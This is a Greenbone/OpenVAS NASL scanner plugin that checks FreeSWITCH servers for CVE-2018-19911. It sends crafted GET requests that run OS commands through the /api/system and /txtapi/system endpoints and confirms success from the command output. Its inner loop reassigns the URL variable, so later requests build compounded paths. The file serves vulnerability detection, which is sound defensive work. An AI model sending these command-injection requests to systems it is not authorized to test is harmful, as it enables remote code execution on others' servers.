# Copyright (C) 2019 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:freeswitch:freeswitch";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.143233");
  script_version("2019-12-10T07:34:00+0000");
  script_tag(name:"last_modification", value:"2019-12-10 07:34:00 +0000 (Tue, 10 Dec 2019)");
  script_tag(name:"creation_date", value:"2019-12-06 09:27:29 +0000 (Fri, 06 Dec 2019)");
  script_tag(name:"cvss_base", value:"7.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2018-19911");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("FreeSWITCH RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_freeswitch_consolidation.nasl", "os_detection.nasl", "global_settings.nasl");
  script_mandatory_keys("freeswitch/detected");
  script_require_ports("Services/www", 8080, 8181);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"FreeSWITCH is prone to a remote code execution vulnerability.");

  script_tag(name:"insight", value:"When mod_xml_rpc is enabled FreeSWITCH allows remote attackers to execute
  arbitrary commands via the api/system or txtapi/system (or api/bg_system or txtapi/bg_system) query string, as
  demonstrated by an api/system?calc URI.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"No known solution is available as of 06th December, 2019.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://github.com/iSafeBlue/freeswitch_rce/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

urls = make_list("/api/system",
                 "/txtapi/system");

cmds = exploit_commands();

foreach url (urls) {
  foreach pattern (keys(cmds)) {
    url = dir + url + "/?" + cmds[pattern];

    req = http_get(port: port, item: url);
    res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

    if (egrep(pattern: pattern, string: res)) {
      report = 'It was possible to execute the "' + cmds[pattern] + '" command.\n\nResult:\n\n' + res;
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
